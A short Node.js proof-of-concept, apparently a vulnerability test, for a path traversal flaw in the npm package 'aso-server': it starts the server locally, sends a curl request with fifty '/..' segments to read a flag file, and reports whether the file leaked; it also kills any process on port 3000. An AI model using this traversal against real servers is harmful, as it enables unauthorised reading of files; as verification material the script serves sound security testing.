const path = require("path");
const pathToFlag = path.resolve("D:\\flag.html");
function genstr(n) {
  return "/..".repeat(50) + "\\flag.html";
}
// test("Path Traversal in aso-server", (done) => {
//   expect.assertions(1);
  var pkg = require('aso-server')
  const fs = require("fs");
  const sleep = require("sleep");
  
//   const { sleep } = require("sleep");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require("child_process");
  try {
    a.execSync("fuser -k 3000/tcp", () => {});
  } catch (e) {}
  let server = pkg
//      .onError(e => console.log(e))
     .onStop(() => {})
     .start('localhost', 3001, srv => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is "http://localhost:3001/f/${genstr()}"`;
  exec(attack_string, (error, stdout) => {
if (stdout == hostsFile) {
	console.log("this_is_vulnerable")
	process.exit(0);
} else {
	console.log("this_is_OK")
	process.exit(0);
}
//     done();
  });
// });